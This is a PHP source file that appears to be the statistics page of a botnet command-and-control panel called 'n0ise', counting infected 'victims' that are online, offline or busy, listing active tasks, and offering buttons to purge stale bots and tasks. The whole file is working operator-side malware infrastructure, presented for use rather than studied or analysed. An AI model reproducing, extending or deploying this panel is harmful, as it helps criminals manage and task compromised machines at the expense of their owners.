<?php

class n0ise_func_statistics {
    var $content;

    function run() {
        global $_n0ise;

        // Default content title
        $this->content .= title("Statistics");

        // Handle delete actions only if the key is set
        if (isset($_GET['delete'])) {
            switch ($_GET['delete']) {
                case 'offline_bots':
                    $_n0ise->query("DELETE FROM n0ise_victims WHERE ConTime < " . (time() - 604800));
                    $this->content .= title("Delete");
                    $this->content .= content("Bots successfully deleted!", "success");
                    break;
                case 'tasks':
                    $_n0ise->query("DELETE FROM n0ise_tasks");
                    $_n0ise->query("DELETE FROM n0ise_task_done");
                    $this->content .= title("Delete");
                    $this->content .= content("Tasks successfully deleted!", "success");
                    break;
            }
        }

        // Fallback if $_n0ise->online is undefined
        $onlineWindow = property_exists($_n0ise, 'online') && is_numeric($_n0ise->online) ? $_n0ise->online : 3600;

        // Fetch statistics from DB
        $query = $_n0ise->query("
            SELECT 
                (SELECT COUNT(*) FROM n0ise_victims) AS bots,
                (SELECT COUNT(*) FROM n0ise_victims WHERE ConTime > " . (time() - $onlineWindow) . ") AS bots_online,
                (SELECT COUNT(*) FROM n0ise_victims WHERE ConTime > " . (time() - 86400) . ") AS bots_online24,
                (SELECT COUNT(*) FROM n0ise_victims WHERE ConTime > " . (time() - 604800) . ") AS bots_online7,
                (SELECT COUNT(*) FROM n0ise_victims WHERE ConTime > " . (time() - $onlineWindow) . " AND taskID != 0) AS bots_busy,
                (
                    SELECT COUNT(*) FROM n0ise_tasks AS t 
                    WHERE t.elapsed > " . time() . " OR (
                        t.elapsed = 0 AND 
                        (SELECT COUNT(*) FROM n0ise_task_done WHERE taskID = t.taskID) < 
                        (SELECT COUNT(*) FROM n0ise_victims)
                    )
                ) AS tasks
        ");

        $ds = mysqli_fetch_array($query, MYSQLI_ASSOC);

        if ($ds) {
            $botsTotal = max($ds['bots'], 1); // prevent division by zero

            $table = '<table>';
            $table .= "<tr><td style='text-align:right;width:40%'>Total Bots:</td><td><b>{$ds['bots']} Bots</b></td></tr>";
            $table .= "<tr><td style='text-align:right;'>Bots Online:</td><td><b>{$ds['bots_online']} Bots</b> (" . round($ds['bots_online'] / $botsTotal * 100, 2) . "%)</td></tr>";
            $table .= "<tr><td style='text-align:right;'>Bots Offline:</td><td><b>" . ($ds['bots'] - $ds['bots_online']) . " Bots</b> (" . round(($ds['bots'] - $ds['bots_online']) / $botsTotal * 100, 2) . "%)</td></tr>";
            $table .= "<tr><td style='text-align:right;'>Bots Online (24 hours):</td><td><b>{$ds['bots_online24']} Bots</b> (" . round($ds['bots_online24'] / $botsTotal * 100, 2) . "%)</td></tr>";
            $table .= "<tr><td style='text-align:right;'>Bots Online (7 days):</td><td><b>{$ds['bots_online7']} Bots</b> (" . round($ds['bots_online7'] / $botsTotal * 100, 2) . "%)</td></tr>";
            $table .= "<tr><td style='text-align:right;'>Busy Bots:</td><td><b>{$ds['bots_busy']} Bots</b> (" . round($ds['bots_busy'] / $botsTotal * 100, 2) . "%)</td></tr>";
            $table .= "<tr><td style='text-align:right;'>Active Tasks:</td><td><b>{$ds['tasks']} Tasks</b></td></tr>";
            $table .= '</table>';

            $table .= '
                <div style="text-align:right;padding:10px">
                    <a href="?delete=offline_bots" onclick="return confirm(\'Do you really want to delete all Bots which are offline for more than one week?\')" class="button"><span>Delete Bots</span></a>
                    <a href="?delete=tasks" onclick="return confirm(\'Do you really want to delete all Tasks?\')" class="button"><span>Delete Tasks</span></a>
                </div>';

            $this->content .= content($table);
        } else {
            $this->content .= content("Error retrieving statistics.", "error");
        }
    }
}
?>
